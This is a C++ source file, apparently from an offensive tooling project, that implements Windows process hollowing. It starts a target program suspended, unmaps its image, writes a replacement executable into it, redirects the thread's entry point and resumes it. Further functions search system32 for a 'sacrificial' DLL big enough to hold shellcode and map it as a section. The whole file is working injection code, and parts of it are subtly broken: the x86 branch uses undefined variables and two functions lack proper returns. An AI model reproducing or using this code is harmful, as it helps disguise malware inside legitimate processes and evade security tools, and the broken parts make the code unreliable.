#include "ProcessHollower.h"
#include <ntstatus.h> 

int ProcessHollower::HollowProcess(string targetExePath, string srcExePath)
{
	NTSTATUS status = STATUS_SUCCESS;
	STARTUPINFOW startupInfo = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	CONTEXT processContext = { 0 };
	PVOID image = NULL, mem = NULL, base = NULL;

	do
	{
		PIMAGE_DOS_HEADER pDosH = NULL;
		PIMAGE_NT_HEADERS pNtH = NULL;
		PIMAGE_SECTION_HEADER pSecH = NULL;


		DWORD i = 0, read = 0, nSizeOfFile = 0;
		HANDLE hFile = NULL;

		processContext.ContextFlags = CONTEXT_FULL;
		memset(&startupInfo, 0, sizeof(startupInfo));
		memset(&processInfo, 0, sizeof(processInfo));

		wchar_t wSrcPath[256];
		memset(wSrcPath, 0, sizeof(wSrcPath));
		mbstowcs(wSrcPath, srcExePath.c_str(), srcExePath.length());
		LPWSTR ptrSrc = wSrcPath;

		wchar_t wDestPath[256];
		memset(wDestPath, 0, sizeof(wDestPath));
		mbstowcs(wDestPath, targetExePath.c_str(), targetExePath.length());
		LPWSTR ptrDest = wDestPath;

		std::cout << "Create Target process in suspended mode" << std::endl;
		if (!CreateProcessW(NULL, ptrDest, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo))
		{
			std::cout << "Unable to run the target executable. CreateProcess failed with error: " << GetLastError() << std::endl;
			return 1;
		}

		std::cout << "Process created in suspended state processId: " << processInfo.dwProcessId << std::endl;
		std::cout << "Opening the replacement executable." << std::endl;

		hFile = CreateFileW(ptrSrc, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			std::cout<<"Unable to open the replacement executable. CreateFile failed with error"<< GetLastError()<<std::endl;
			NtTerminateProcess(processInfo.hProcess, 1);
			return 1;
		}

		nSizeOfFile = GetFileSize(hFile, NULL);
		image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (image == NULL)
		{
			std::cout << "VirtualAlloc failed to allocate memory" << std::endl;
			NtTerminateProcess(processInfo.hProcess, 1);
			return 1;
		}

		if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL))
		{
			std::cout<< "Unable to read the replacement executable. ReadFile failed with error: " << GetLastError()<<std::endl;
			NtTerminateProcess(processInfo.hProcess, 1);
			return 1;
		}

		NtClose(hFile);

		pDosH = (PIMAGE_DOS_HEADER)image;
		if (pDosH->e_magic != IMAGE_DOS_SIGNATURE)
		{
			std::cout << "Invalid executable format: "<<std::endl;
			NtTerminateProcess(processInfo.hProcess, 1);
			return 1;
		}

		// IMAGE_NT_HEADERS
		pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);

		// Get the thread context of the child process's primary thread
		status = NtGetContextThread(processInfo.hThread, &processContext); 
		if (status != STATUS_SUCCESS)
		{
			std::cout << "Invalid executable format: " << std::endl;
			NtTerminateProcess(processInfo.hProcess, 1);
			return 1;
		}

#ifdef _WIN64
		// Get the PEB address from the ebx register and read the base address of the executable image from the PEB
		NtReadVirtualMemory(processInfo.hProcess, (PVOID)(processContext.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL); 
#endif

#ifdef _X86_
		// Get the PEB address from the ebx register and read the base address of the executable image from the PEB
		NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); 
#endif
		// If the original image has same base address as the replacement executable, unmap the original executable from the child process.
		if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) 
		{
			std::cout<<"Unmapping original executable image from child process. Address: "<< (SIZE_T)base <<std::endl;
			// Unmap the executable image using NtUnmapViewOfSection function
			NtUnmapViewOfSection(processInfo.hProcess, base); 
		}

		std::cout<<"Allocating memory in child process."<<std::endl;

		// Allocate memory for the executable image
		mem = VirtualAllocEx(processInfo.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
		if (mem == NULL)
		{
			std::cout<<"Unable to allocate memory in child process. VirtualAllocEx failed with error: " <<GetLastError()<<std::endl;
			NtTerminateProcess(processInfo.hProcess, 1); // We failed, terminate the child process.
			return 1;
		}

		std::cout<<"Memory allocated. Address: "<<(SIZE_T)mem <<std::endl;
		std::cout<<"Writing executable image into child process."<< std::endl;

		// Write the header of the replacement executable into child process
		status = NtWriteVirtualMemory(processInfo.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL);
		if (status != STATUS_SUCCESS)
		{
			std::cout << "Unable to write memory in child process. NtWriteVirtualMemory error: " << status << std::endl;
			break;
		}

		for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++)
		{
			pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			// Write the remaining sections of the replacement executable into child process
			status = NtWriteVirtualMemory(processInfo.hProcess, (PVOID)((LPBYTE)mem + pSecH->VirtualAddress), (PVOID)((LPBYTE)image + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
			if (status != STATUS_SUCCESS)
			{
				std::cout << "Unable to write memory in child process. NtWriteVirtualMemory error: " << status << std::endl;
				NtTerminateProcess(processInfo.hProcess, 1);
				VirtualFree(image, 0, MEM_RELEASE);
				return 1;
			}
		}


#ifdef _WIN64
		// Set the eax register to the entry point of the injected image
		processContext.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); 
		std::cout<<"New entry point: " <<processContext.Rcx<< std::endl;

		// Write the base address of the injected image into the PEB
		status = NtWriteVirtualMemory(processInfo.hProcess, (PVOID)(processContext.Rdx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); 
		if (status != STATUS_SUCCESS)
		{
			std::cout << "Unable to write memory in child process. NtWriteVirtualMemory error: " << status << std::endl;
			break;
		}
#endif

#ifdef _X86_
		ctx.Eax = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image
		std::cout<<"New entry point: " <<ctx.Eax<<std::endl;

		// Write the base address of the injected image into the PEB
		status = NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
		if (status != STATUS_SUCCESS)
		{
			std::cout << "Unable to write memory in child process. NtWriteVirtualMemory error: " << status << std::endl;
			break;
		}
#endif


		std::cout<<"Setting the context of the child process's primary thread."<<std::endl;

		// Set the thread context of the child process's primary thread
		status = NtSetContextThread(processInfo.hThread, &processContext);
		if (status != STATUS_SUCCESS)
		{
			std::cout << "Unable to write memory in child process. NtWriteVirtualMemory error: " << status << std::endl;
			break;
		}

		std::cout <<"Resuming child process's primary thread."<< std::endl;

		// Resume the primary thread
		status = NtResumeThread(processInfo.hThread, NULL); 
		if (status != STATUS_SUCCESS)
		{
			std::cout << "NtResumeThread failed error: " << status << std::endl;
			break;
		}

		std::cout<<"Thread resumed."<<std::endl;
		std::cout<<"Waiting for child process to terminate."<<std::endl;

		// Wait for the child process to terminate
		NtWaitForSingleObject(processInfo.hProcess, FALSE, NULL); 

		std::cout<<"Process terminated."<<std::endl;

		NtClose(processInfo.hThread); // Close the thread handle
		NtClose(processInfo.hProcess); // Close the process handle

		VirtualFree(image, 0, MEM_RELEASE); // Free the allocated memory
		image = NULL;

	}
	while (FALSE);

	if (status != STATUS_SUCCESS)
	{
		// We failed, terminate the child process.
		NtTerminateProcess(processInfo.hProcess, 1); 
	}

	if (image != NULL)
	{
		VirtualFree(image, 0, MEM_RELEASE);
		image = NULL;
	}

	return 0;
}

BOOL ProcessHollower::findSacrificialDll(HANDLE hProcess, wchar_t* FilePath, size_t size_FilePath, size_t size_of_shellcode)
{
	if (size_FilePath < MAX_PATH * 2)
	{
		return FALSE;
	}

	wchar_t				SearchFilePath[MAX_PATH * 2];
	HANDLE				hFind = NULL;
	BOOL				found = FALSE;
	WIN32_FIND_DATAW	Wfd;
	size_t				size_dest = 0;

	if (GetSystemDirectoryW(SearchFilePath, MAX_PATH * 2) == 0) {
		printf("GetSystemDirectoryW: %d\n", GetLastError());
		return FALSE;
	}

	printf("Finding a sacrificial Dll\n");
	wcscat_s(SearchFilePath, MAX_PATH * 2, L"\\*.dll");
	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
		do {
			// if the DLL isn't already loaded
			if (!isDllLoaded(hProcess, Wfd.cFileName)) {

				if (GetSystemDirectoryW(FilePath, MAX_PATH * 2) == 0) {
					printf("GetSystemDirectoryW: %d\n", GetLastError());
					return FALSE;
				}

				// Write File Path
				wcscat_s(FilePath, MAX_PATH * 2, L"\\");
				wcscat_s(FilePath, MAX_PATH * 2, Wfd.cFileName);

				wprintf(L"Checking %ls\n", FilePath);

				size_dest = getSizeOfImage(FilePath);

				wprintf(L"DLL is 0x%x bytes\n", size_dest);

				if (size_of_shellcode < size_dest) {
					found = TRUE;
					wprintf(L"DLL Found! %ls \n", FilePath);
				}
			}
		} while (!found && FindNextFileW(hFind, &Wfd));
		// close the handle 
		FindClose(hFind);
	}
	return found;
}

BOOL ProcessHollower::isDllLoaded(HANDLE hProcess, wchar_t* filePath)
{
	// Local
	if (hProcess == (HANDLE)-1)
		return GetModuleHandleW(filePath) != NULL;
	// remote – more on this later on
	else FALSE;
}

BOOL ProcessHollower::CreateSection(LPWSTR dllPath, HANDLE hProcess)
{
	NTSTATUS status = 0x0;
	DWORD  protect = 0x0;
	HANDLE hFile = NULL, hSection = NULL;
	BYTE* mapped = NULL;

	SIZE_T bytesWritten = 0;
	void* allocation = NULL;
	DWORD oldProtect = 0;
	HANDLE hThread = 0;

	hFile = CreateFileW(dllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// Create Section - NtCreateSection
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);

	// Close file
	if (!NT_SUCCESS(status)) {
		printf("NtCreateSection: 0x%x\n", status);
		CloseHandle(hFile);
		return NULL;
	}
	printf("Section created - hSection = 0x%x\n", hSection);

	// Map Section - NtMapViewOfSection
	protect = PAGE_READWRITE;
	mapped = (BYTE*)MapDllImage(hSection, hProcess, protect);
	if (mapped == NULL) {
		CloseHandle(hSection);
		CloseHandle(hFile);
		return NULL;
	}

	if (CloseHandle(hFile) == 0) {
		// this is not a fatal error
		printf("hFile: %lu\n", GetLastError());
	}
}

PVOID ProcessHollower::MapDllImage(HANDLE hSection, HANDLE hProcess, DWORD protect)
{
	NTSTATUS			status;
	PVOID				sectionBaseAddress;
	ULONG				viewSize;
	SECTION_INHERIT		inheritDisposition;

	if (hProcess == NULL)
		return NULL;

	sectionBaseAddress = NULL;
	viewSize = 0;
	inheritDisposition = ViewShare;

	status = NtMapViewOfSection((HANDLE)hSection,
		(HANDLE)hProcess,
		(PVOID*)&sectionBaseAddress,
		(ULONG_PTR)NULL,
		(SIZE_T)NULL,
		(PLARGE_INTEGER)NULL,
		&viewSize,
		inheritDisposition,
		(ULONG)PtrToUlong(NULL),
		(ULONG)protect);

	if (!NT_SUCCESS(status)) {
		printf("NtMapViewOfSection: 0x%x\n", status);
		return NULL;
	}

	return sectionBaseAddress;
}